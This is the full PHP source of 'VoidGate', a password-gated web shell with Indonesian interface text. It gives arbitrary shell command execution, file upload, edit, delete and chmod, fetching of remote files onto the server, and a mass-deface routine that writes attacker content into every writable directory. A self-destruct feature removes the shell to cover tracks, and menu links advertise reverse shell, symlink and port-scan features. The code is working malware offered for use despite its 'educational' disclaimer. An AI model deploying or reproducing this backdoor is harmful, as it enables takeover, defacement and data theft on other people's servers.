<?php
/*
============================================
 ヤミRoot VoidGate by 0x6ick
 Copyright © 2025 by 6ickwhisper
 Email: 6ickwhispers@gmail.com
 Site: https://0x6ick.my.id
       https://0x6ick.blogspot.com
 Motto: Explore. Exploit. Educate.
============================================
*/
session_start();
$password = '6ickZone1337'; // default
$cookie_name = 'ghost_session_id_'.md5(__FILE__);

// Logout
if (isset($_GET['logout'])) {
    setcookie($cookie_name, '', time() - 3600, "/");
    header('Location: ' . basename(__FILE__));
    exit();
}

// Cek login via POST atau COOKIE
$is_logged_in = false;
if (isset($_COOKIE[$cookie_name]) && $_COOKIE[$cookie_name] === md5($password)) {
    $is_logged_in = true;
} elseif (isset($_POST['password']) && $_POST['password'] === $password) {
    setcookie($cookie_name, md5($password), time() + (86400 * 1), "/"); // Cookie berlaku 1 hari
    $is_logged_in = true;
}

// Jika tidak login, tampilkan halaman login dan hentikan script.
if (!$is_logged_in) {
    $theme_bg = "#000000";
    $theme_fg = "#00FFFF";
    $theme_border_color = "#00FFFF";
    ?>
    <!DOCTYPE HTML>
    <html>
    <head>
        <title>VoidGate Login</title>
        <link href="https://fonts.googleapis.com/css?family=Kelly+Slab" rel="stylesheet" type="text/css">
        <style>
            body { background-color: <?php echo $theme_bg; ?>; color: <?php echo $theme_fg; ?>; font-family: 'Kelly Slab', cursive; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
            .login-box { background-color: #1a1a1a; border: 1px solid <?php echo $theme_border_color; ?>; padding: 30px; border-radius: 8px; text-align: center; box-shadow: 0 0 20px rgba(0, 255, 255, 0.2); }
            h3 { color: #fff; }
            input[type="password"] { background: #000; color: <?php echo $theme_fg; ?>; border: 1px solid <?php echo $theme_border_color; ?>; padding: 10px; border-radius: 5px; width: 200px; }
            input[type="submit"] { background: <?php echo $theme_fg; ?>; color: <?php echo $theme_bg; ?>; border: none; padding: 10px 20px; border-radius: 5px; cursor: pointer; font-weight: bold; margin-top: 15px; }
        </style>
    </head>
    <body>
        <div class="login-box">
            <h3><i class="fa fa-lock"></i> Authentication Required</h3>
            <form method="POST" action="">
                <input type="password" name="password" autofocus>
                <br>
                <input type="submit" value="Login">
            </form>
        </div>
    </body>
    </html>
    <?php
    exit();
}

// ==================================================================
// MAIN SHELL CODE STARTS HERE (Only runs if logged in)
// ==================================================================

error_reporting(0);
@ini_set('output_buffering', 0);
@ini_set('display_errors', 0);
ini_set('memory_limit', '256M');
header('Content-Type: text/html; charset=UTF-8');
ob_end_clean();

// --- CONFIG ---
$title = "ヤミRoot VoidGate";
$author = "0x6ick";
$theme_bg = "#0a0a0f";
$theme_fg = "#E0FF00";
$theme_highlight = "#FF00C8";
$theme_link = "#00FFF7";
$theme_link_hover = "#FF00A0";
$theme_border_color = "#7D00FF";
$theme_table_header_bg = "#1a0025";
$theme_table_row_hover = "#330033";
$theme_input_bg = "#120024";
$theme_input_fg = "#00FFB2";
$font_family = "'Orbitron', sans-serif";
$message_success_color = "#39FF14";
$message_error_color = "#FF0033";

// --- FUNCTIONS ---
function sanitizeFilename($filename) { return basename($filename); }
function exe($cmd) { if (function_exists('exec')) { exec($cmd . ' 2>&1', $output); return implode("\n", $output); } elseif (function_exists('shell_exec')) { return shell_exec($cmd); } elseif (function_exists('passthru')) { ob_start(); passthru($cmd); return ob_get_clean(); } elseif (function_exists('system')) { ob_start(); system($cmd); return ob_get_clean(); } return "Command execution disabled."; }
function perms($file){ $perms = @fileperms($file); if ($perms === false) return '????'; if (($perms & 0xC000) == 0xC000) $info = 's'; elseif (($perms & 0xA000) == 0xA000) $info = 'l'; elseif (($perms & 0x8000) == 0x8000) $info = '-'; elseif (($perms & 0x6000) == 0x6000) $info = 'b'; elseif (($perms & 0x4000) == 0x4000) $info = 'd'; elseif (($perms & 0x2000) == 0x2000) $info = 'c'; elseif (($perms & 0x1000) == 0x1000) $info = 'p'; else $info = 'u'; $info .= (($perms & 0x0100) ? 'r' : '-'); $info .= (($perms & 0x0080) ? 'w' : '-'); $info .= (($perms & 0x0040) ? (($perms & 0x0800) ? 's' : 'x' ) : (($perms & 0x0800) ? 'S' : '-')); $info .= (($perms & 0x0020) ? 'r' : '-'); $info .= (($perms & 0x0010) ? 'w' : '-'); $info .= (($perms & 0x0008) ? (($perms & 0x0400) ? 's' : 'x' ) : (($perms & 0x0400) ? 'S' : '-')); $info .= (($perms & 0x0004) ? 'r' : '-'); $info .= (($perms & 0x0002) ? 'w' : '-'); $info .= (($perms & 0x0001) ? (($perms & 0x0200) ? 't' : 'x' ) : (($perms & 0x0200) ? 'T' : '-')); return $info; }
function delete_recursive($target) { if (!file_exists($target)) return true; if (!is_dir($target)) return unlink($target); foreach (scandir($target) as $item) { if ($item == '.' || $item == '..') continue; if (!delete_recursive($target . DIRECTORY_SEPARATOR . $item)) return false; } return rmdir($target); }
function zip_add_folder($zip, $folder, $base_path_length) { $files = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($folder), RecursiveIteratorIterator::LEAVES_ONLY); foreach ($files as $file) { if (!$file->isDir()) { $file_path = $file->getRealPath(); $relative_path = substr($file_path, $base_path_length); $zip->addFile($file_path, $relative_path); } } }
function redirect_with_message($msg_type = '', $msg_text = '', $current_path = '') { global $path; $redirect_path = !empty($current_path) ? $current_path : $path; $params = ['path' => $redirect_path]; if ($msg_type) $params['msg_type'] = $msg_type; if ($msg_text) $params['msg_text'] = $msg_text; header("Location: ?" . http_build_query($params)); exit(); }

// --- INITIAL SETUP & PATH ---
$path = realpath(isset($_GET['path']) ? $_GET['path'] : getcwd());
$path = str_replace('\\','/',$path);

// --- HANDLERS FOR ACTIONS THAT REDIRECT ---
if(isset($_POST['start_mass_deface'])) { $mass_deface_results = ''; function mass_deface_recursive($dir, $file, $content, &$res) { if(!is_writable($dir)) {$res .= "[<font color=red>FAILED</font>] ".htmlspecialchars($dir)."<br>"; return;} foreach(scandir($dir) as $item) { if($item === '.' || $item === '..') continue; $lokasi = $dir.DIRECTORY_SEPARATOR.$item; if(is_dir($lokasi)) { if(is_writable($lokasi)) { file_put_contents($lokasi.DIRECTORY_SEPARATOR.$file, $content); $res .= "[<font color=lime>DONE</font>] ".htmlspecialchars($lokasi.DIRECTORY_SEPARATOR.$file)."<br>"; mass_deface_recursive($lokasi, $file, $content, $res); } else { $res .= "[<font color=red>FAILED</font>] ".htmlspecialchars($lokasi)."<br>"; } } } } function mass_deface_flat($dir, $file, $content, &$res) { if(!is_writable($dir)) {$res .= "[<font color=red>FAILED</font>] ".htmlspecialchars($dir)."<br>"; return;} foreach(scandir($dir) as $item) { if($item === '.' || $item === '..') continue; $lokasi = $dir.DIRECTORY_SEPARATOR.$item; if(is_dir($lokasi) && is_writable($lokasi)) { file_put_contents($lokasi.DIRECTORY_SEPARATOR.$file, $content); $res .= "[<font color=lime>DONE</font>] ".htmlspecialchars($lokasi.DIRECTORY_SEPARATOR.$file)."<br>"; } } } if($_POST['tipe_sabun'] == 'mahal') mass_deface_recursive($_POST['d_dir'], $_POST['d_file'], $_POST['script_content'], $mass_deface_results); else mass_deface_flat($_POST['d_dir'], $_POST['d_file'], $_POST['script_content'], $mass_deface_results); $_SESSION['feature_output'] = $mass_deface_results; redirect_with_message('success', 'Mass Deface Selesai!', $path); }
if(isset($_FILES['file_upload'])){ $file_name = sanitizeFilename($_FILES['file_upload']['name']); if(copy($_FILES['file_upload']['tmp_name'], $path.'/'.$file_name)) redirect_with_message('success', 'UPLOAD SUCCESS: ' . $file_name, $path); else redirect_with_message('error', 'File Gagal Diupload !!', $path); }
if (isset($_POST['bulk_action']) && class_exists('ZipArchive')) { $action = $_POST['bulk_action']; $selected_files = isset($_POST['selected_files']) ? $_POST['selected_files'] : []; if ($action === 'zip_selected' && !empty($selected_files)) { $zip_filename = 'archive_' . date('Y-m-d_H-i-s') . '.zip'; $zip_filepath = $path . DIRECTORY_SEPARATOR . $zip_filename; $zip = new ZipArchive(); if ($zip->open($zip_filepath, ZipArchive::CREATE | ZipArchive::OVERWRITE) === TRUE) { foreach ($selected_files as $file) { $file_path = realpath($file); if (is_file($file_path)) $zip->addFile($file_path, basename($file_path)); elseif (is_dir($file_path)) zip_add_folder($zip, $file_path, strlen(dirname($file_path) . DIRECTORY_SEPARATOR)); } $zip->close(); redirect_with_message('success', 'File berhasil di-zip ke: ' . $zip_filename, $path); } else { redirect_with_message('error', 'Gagal membuat file zip!', $path); } } }
if(isset($_GET['option']) && isset($_POST['opt_action'])){ $target_full_path = $_POST['path_target']; $action = $_POST['opt_action']; $current_dir = realpath(isset($_GET['path']) ? $_GET['path'] : getcwd()); switch ($action) { case 'delete': if (delete_recursive($target_full_path)) redirect_with_message('success', 'DELETE SUCCESS !!', $current_dir); else redirect_with_message('error', 'Gagal menghapus! Periksa izin.', $current_dir); break; case 'chmod_save': if(chmod($target_full_path, octdec($_POST['perm_value']))) redirect_with_message('success', 'CHMOD SUCCESS !!', $current_dir); else redirect_with_message('error', 'CHMOD Gagal !!', $current_dir); break; case 'rename_save': $new_full_path = dirname($target_full_path).'/'.sanitizeFilename($_POST['new_name_value']); if(rename($target_full_path, $new_full_path)) redirect_with_message('success', 'RENAME SUCCESS !!', $current_dir); else redirect_with_message('error', 'RENAME Gagal !!', $current_dir); break; case 'edit_save': if(is_writable($target_full_path)) { if(file_put_contents($target_full_path, $_POST['src_content'])) redirect_with_message('success', 'EDIT SUCCESS !!', $current_dir); else redirect_with_message('error', 'Edit File Gagal !!', $current_dir); } else { redirect_with_message('error', 'File tidak writable!', $current_dir); } break; case 'extract_save': if (class_exists('ZipArchive')) { $zip = new ZipArchive; if ($zip->open($target_full_path) === TRUE) { $zip->extractTo($current_dir); $zip->close(); redirect_with_message('success', 'File berhasil diekstrak!', $current_dir); } else { redirect_with_message('error', 'Gagal membuka file zip!', $current_dir); } } else { redirect_with_message('error', 'Class ZipArchive tidak ditemukan!', $current_dir); } break; } }
if(isset($_GET['create_new'])) { $target_path_new = $path . '/' . sanitizeFilename($_POST['create_name']); if ($_POST['create_type'] == 'file') { if (@file_put_contents($target_path_new, '') !== false) redirect_with_message('success', 'File Baru Berhasil Dibuat', $path); else redirect_with_message('error', 'Gagal membuat file baru!', $path); } elseif ($_POST['create_type'] == 'dir') { if (@mkdir($target_path_new)) redirect_with_message('success', 'Folder Baru Berhasil Dibuat', $path); else redirect_with_message('error', 'Gagal membuat folder baru!', $path); } }
if(isset($_POST['curl_download'])) { $url = $_POST['url']; $filename = sanitizeFilename(basename($url)); if (empty($filename)) { $filename = 'downloaded_file'; } if (copy($url, $path . '/' . $filename)) { redirect_with_message('success', 'File ' . $filename . ' berhasil di-download!', $path); } else { redirect_with_message('error', 'Gagal men-download file dari URL!', $path); } }
?>
<!DOCTYPE HTML>
<html>
<head>
<link href="https://fonts.googleapis.com/css?family=Kelly+Slab" rel="stylesheet" type="text/css">
<link href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet" type="text/css"/>
<title><?php echo htmlspecialchars($title); ?></title>
<style>
body{font-family:'Orbitron',sans-serif;background-color:<?php echo $theme_bg;?>;color:<?php echo $theme_fg;?>;margin:0;padding:0;} a{font-size:1em;color:<?php echo $theme_link;?>;text-decoration:none;} a:hover{color:<?php echo $theme_link_hover;?>;} table{border-collapse:collapse;width:95%;max-width:1200px;margin:15px auto;} .td_home{border:2px solid <?php echo $theme_table_row_hover;?>;padding:7px;vertical-align:middle;} #content tr:hover{background-color:<?php echo $theme_table_row_hover;?>;} #content .first{background-color:<?php echo $theme_table_header_bg;?>;font-weight:bold;padding:10px;} input,select,textarea{border:1px solid <?php echo $theme_link_hover;?>;border-radius:5px;background:<?php echo $theme_input_bg;?>;color:<?php echo $theme_input_fg;?>;font-family:'Kelly Slab',cursive;padding:5px;box-sizing:border-box;} input[type="submit"]{background:<?php echo $theme_input_bg;?>;color:<?php echo $theme_fg;?>;border:2px solid <?php echo $theme_fg;?>;cursor:pointer;font-weight:bold;} input[type="submit"]:hover{background:<?php echo $theme_fg;?>;color:<?php echo $theme_input_bg;?>;} h1,h3{font-family:'Kelly Slab';text-align:center;} h1{font-size:35px;color:white;margin:20px 0 10px;} h3{color:<?php echo $theme_highlight;?>} .path-nav{margin:10px auto;width:95%;max-width:1200px;text-align:left;word-wrap:break-word;} .message{padding:10px;margin:10px auto;border-radius:5px;width:95%;max-width:1200px;font-weight:bold;text-align:center;} .message.success{background-color:<?php echo $message_success_color;?>;color:<?php echo $theme_bg;?>;} .message.error{background-color:<?php echo $message_error_color;?>;color:white;} .section-box{background-color:#1a1a1a;border:1px solid <?php echo $theme_border_color;?>;padding:15px;margin:20px auto;border-radius:8px;width:95%;max-width:1200px;} .main-menu{margin:20px auto;width:95%;max-width:1200px;text-align:center;padding:10px 0;border-top:1px solid <?php echo $theme_border_color;?>;border-bottom:1px solid <?php echo $theme_border_color;?>;} .main-menu div { margin-bottom: 8px; } .main-menu a{margin:0 8px;font-size:1.1em;white-space:nowrap;} pre{background-color:#0e0e0e;border:1px solid #444;padding:10px;overflow-x:auto;white-space:pre-wrap;word-wrap:break-word;color:#00FFD1;} code{background:#333;color:#FFB800;padding:2px 5px;border-radius:3px;} details summary {cursor:pointer; background:#222; padding:5px; border-radius:3px; margin-bottom: 5px;}
</style>
</head>
<body>
<a href="?"><h1 style="color: white;"><?php echo htmlspecialchars($title); ?></h1></a>
<?php
if(isset($_GET['msg_text'])) { echo "<div class='message ".htmlspecialchars($_GET['msg_type'])."'>".htmlspecialchars($_GET['msg_text'])."</div>"; }
if(isset($_SESSION['feature_output'])) { echo '<div class="section-box"><h3>Hasil Fitur Sebelumnya:</h3><pre>'.$_SESSION['feature_output'].'</pre></div>'; unset($_SESSION['feature_output']); }
?>
 <style>
  .server-info {
    font-family: 'Kelly Slab', cursive;
    font-size: 14px;
    color: white;
    width: auto;
    display: inline-block;
    margin: 0;
    padding: 0;
  }
  .server-info td {
    padding: 4px 10px;
    vertical-align: top;
  }
  .label-icon {
    color: white;
  }
  .value {
    color: <?php echo $theme_fg; ?>;
  }
</style>

<table class="server-info">
 
  <tr>
    <td class="label-icon"><i class='fa fa-user'></i> User / IP</td>
    <td>: <span class="value"><?php echo $_SERVER['REMOTE_ADDR']; ?></span></td>
  </tr>
  <tr>
    <td class="label-icon"><i class='fa fa-desktop'></i> Host / Server</td>
    <td>: <span class="value"><?php echo gethostbyname($_SERVER['HTTP_HOST'])." / ".$_SERVER['SERVER_NAME']; ?></span></td>
  </tr>
<tr>
<td class="label-icon"><i class='fa fa-cog'></i> Web Server</td>
    <td>: <span class="value"><?php echo $_SERVER['SERVER_SOFTWARE']; ?></span></td>
  </tr>
  <tr>
    <td class="label-icon"><i class='fa fa-hdd-o'></i> System</td>
  </tr>
</table>
<div class="main-menu">
    <div>
        <a href="?path=<?php echo urlencode($path); ?>&action=cmd">Command</a> |
        <a href="?path=<?php echo urlencode($path); ?>&action=upload_form">Upload</a> |
        <a href="?path=<?php echo urlencode($path); ?>&action=create_form">Create</a>
    </div>
    <div>
        <a href="?path=<?php echo urlencode($path); ?>&action=mass_deface_form">Mass Deface</a> |
        <a href="?path=<?php echo urlencode($path); ?>&action=jumping">Jumping</a> |
        <a href="?path=<?php echo urlencode($path); ?>&action=symlink">Symlink</a> |
        <a href="?path=<?php echo urlencode($path); ?>&action=reverse_shell">Reverse Shell</a>
    </div>
    <div>
        <a href="?path=<?php echo urlencode($path); ?>&action=ping">Ping</a> |
        <a href="?path=<?php echo urlencode($path); ?>&action=portscan">Port Scan</a> |
        <a href="?path=<?php echo urlencode($path); ?>&action=dnslookup">DNS Lookup</a> |
        <a href="?path=<?php echo urlencode($path); ?>&action=whois">Whois</a> |
        <a href="?path=<?php echo urlencode($path); ?>&action=header">Header</a> |
        <a href="?path=<?php echo urlencode($path); ?>&action=curl">cURL</a>
    </div>
    <div style="margin-top: 10px; border-top: 1px dashed #555; padding-top: 10px;">
        <a href="?action=about">About</a> |
        <a href="?action=self_delete" style="color: red; font-weight: bold;"><i class="fa fa-fire"></i> SELF DESTRUCT <i class="fa fa-fire"></i></a> |
        <a href="?logout=true" style="color: yellow;">Logout</a>
    </div>
</div>
<div class="path-nav">
    <i class="fa fa-folder-o"></i> :
    <?php
    $paths_array = explode('/', trim($path, '/'));
    echo '<a href="?path=/">/</a>';
    $current_built_path = '';
    foreach($paths_array as $pat){
        if(empty($pat)) continue;
        $current_built_path .= '/' . $pat;
        echo '<a href="?path='.urlencode($current_built_path).'">'.htmlspecialchars($pat).'</a>/';
    }
    ?>
</div>
<?php
$show_file_list = true;
if (isset($_GET['action'])) {
    $show_file_list = false;
    echo '<div class="section-box">';
    switch ($_GET['action']) {
        case 'about': echo '<h3>About This Shell</h3><pre>
  __     __    _     _  ____       _       
\ \   / /__ (_) __| |/ ___| __ _| |_ ___ 
 \ \ / / _ \| |/ _` | |  _ / _` | __/ _ \
  \ V / (_) | | (_| | |_| | (_| | ||  __/
   \_/ \___/|_|\__,_|\____|\__,_|\__\___|
</pre><p style="text-align:center;">A powerful, feature-rich shell developed by <strong>'.htmlspecialchars($author).'</strong> with the partner Nyx6st.</p><p style="text-align:center;">This toolkit is designed for educational and authorized security testing purposes only.</p>'; break;
        case 'self_delete': echo '<h3><i class="fa fa-fire" style="color:red;"></i> Self Destruct Sequence</h3>'; if (isset($_POST['confirm_self_delete']) && isset($_POST['confirmation_text'])) { if ($_POST['confirmation_text'] === 'HAPUS') { $main_script_name = basename(__FILE__); $cleaner_script_name = 'cleaner_' . uniqid() . '.php'; $cleaner_code = "<?php @unlink('{$main_script_name}'); echo '<body style=\"background:black; color:lime; font-family:monospace; text-align:center; padding-top: 20%;\"><h1>Goodbye.</h1><p>Main script [{$main_script_name}] has been deleted.</p><p>This cleaner will now self-destruct.</p></body>'; @unlink(__FILE__); ?>"; if (file_put_contents($cleaner_script_name, $cleaner_code)) { header("Location: {$cleaner_script_name}"); exit(); } else { echo '<p style="color:red;"><strong>GAGAL!</strong> Tidak bisa membuat agen pembersih. Cek izin tulis direktori.</p>'; } } else { echo '<p style="color:yellow;">Teks konfirmasi salah. Penghapusan dibatalkan.</p>'; } } echo '<p style="color:yellow; text-align:center; font-size:1.2em;"><strong>PERINGATAN TINGKAT AKHIR!</strong></p>'; echo '<p style="text-align:center;">Anda akan menghapus file shell ini secara permanen dari server.<br>Tindakan ini <strong>TIDAK BISA DIBATALKAN</strong>.</p>'; echo '<p style="text-align:center; margin-top:20px;">Untuk melanjutkan, ketik kata <strong>HAPUS</strong> di dalam kotak di bawah ini:</p>'; echo '<form method="POST" action="?action=self_delete" style="text-align:center; margin-top:10px;"><input type="text" id="confirmation_input" name="confirmation_text" autocomplete="off" style="width: 200px; text-align:center; text-transform:uppercase;"><br><br><input type="submit" id="delete_button" name="confirm_self_delete" value="HAPUS PERMANEN SEKARANG" style="background:grey; color:white; height:40px; font-size:1.1em;" disabled></form>'; echo '<script>const confirmInput = document.getElementById("confirmation_input"); const deleteButton = document.getElementById("delete_button"); const requiredText = "HAPUS"; confirmInput.addEventListener("input", function() { if (confirmInput.value.toUpperCase() === requiredText) { deleteButton.disabled = false; deleteButton.style.background = "red"; deleteButton.style.cursor = "pointer"; } else { deleteButton.disabled = true; deleteButton.style.background = "grey"; deleteButton.style.cursor = "not-allowed"; } }); </script>'; echo '<p style="text-align:center; margin-top:20px;"><a href="?path='.urlencode($path).'">Tidak, Batal! Kembali ke File Manager</a></p>'; break;
        // Nyx6st
        default: echo '<h3>Fitur Tidak Dikenal</h3>'; break;
    }
    echo '</div>';
}

if ($show_file_list) {
    echo '<form method="POST" action="?path='.urlencode($path).'">';
    echo '<div id="content"><table><tr class="first"><th><input type="checkbox" onclick="document.querySelectorAll(\'.file-checkbox\').forEach(e=>e.checked=this.checked);"></th><th>Name</th><th>Size</th><th>Perm</th><th>Options</th></tr>';
    $scandir_items = @scandir($path);
    if ($scandir_items) {
        usort($scandir_items, function($a, $b) use ($path) { if ($a == '..') return -1; if ($b == '..') return 1; if (is_dir($path.'/'.$a) && !is_dir($path.'/'.$b)) return -1; if (!is_dir($path.'/'.$a) && is_dir($path.'/'.$b)) return 1; return strcasecmp($a, $b); });
        foreach($scandir_items as $item){
            if($item == '.') continue;
            $full_item_path = $path.DIRECTORY_SEPARATOR.$item;
            $encoded_full_item_path = urlencode($full_item_path);
            echo "<tr><td class='td_home' style='text-align:center;'>";
            if ($item != '..') echo "<input type='checkbox' class='file-checkbox' name='selected_files[]' value='".htmlspecialchars($full_item_path)."'>";
            echo "</td><td class='td_home' style='word-break:break-all;'>";
            if($item == '..') echo "<i class='fa fa-folder-open-o'></i> <a href=\"?path=".urlencode(dirname($path))."\">".htmlspecialchars($item)."</a>";
            elseif(is_dir($full_item_path)) echo "<i class='fa fa-folder-o'></i> <a href=\"?path=$encoded_full_item_path\">".htmlspecialchars($item)."</a>";
            else echo "<i class='fa fa-file-o'></i> <a href=\"?action=view_file&target_file=$encoded_full_item_path&path=".urlencode($path)."\">".htmlspecialchars($item)."</a>";
            echo "</td><td class='td_home' style='text-align:center;white-space:nowrap;'>".(is_file($full_item_path) ? round(@filesize($full_item_path)/1024,2).' KB' : '--')."</td>";
            echo "<td class='td_home' style='text-align:center;'><font color='".(is_writable($full_item_path) ? '#57FF00' : (!is_readable($full_item_path) ? '#FF0004' : $theme_fg))."'>".perms($full_item_path)."</font></td>";
            echo "<td class='td_home' style='text-align:center;'><select style='width:100px;' onchange=\"if(this.value) window.location.href='?action='+this.value+'&target_file={$encoded_full_item_path}&path=".urlencode($path)."'\"><option value=''>Action</option><option value='delete'>Delete</option>";
            if(is_file($full_item_path)) { echo "<option value='edit_form'>Edit</option>"; if(class_exists('ZipArchive') && pathinfo($full_item_path, PATHINFO_EXTENSION) == 'zip') echo "<option value='extract_form'>Extract</option>"; }
            echo "<option value='rename_form'>Rename</option><option value='chmod_form'>Chmod</option></select></td></tr>";
        }
    } else { echo "<tr><td colspan='5' style='text-align:center;'><font color='red'>Gagal membaca direktori.</font></td></tr>"; }
    if (class_exists('ZipArchive')) {
        echo '<tfoot><tr class="first"><td colspan="5">With selected: <select name="bulk_action"><option value="">Choose...</option><option value="zip_selected">Zip</option></select> <input type="submit" value="Go"></td></tr></tfoot>';
    }
    echo '</table></div></form>';
}
?>
<hr style="border-top: 1px solid <?php echo $theme_border_color; ?>; width: 95%; max-width: 1200px; margin: 15px auto;">
<center><font color="#fff" size="2px"><b>Coded With &#x1f497; by <font color="#7e52c6"><?php echo htmlspecialchars($author); ?></font></b></center>
</body>
</html>
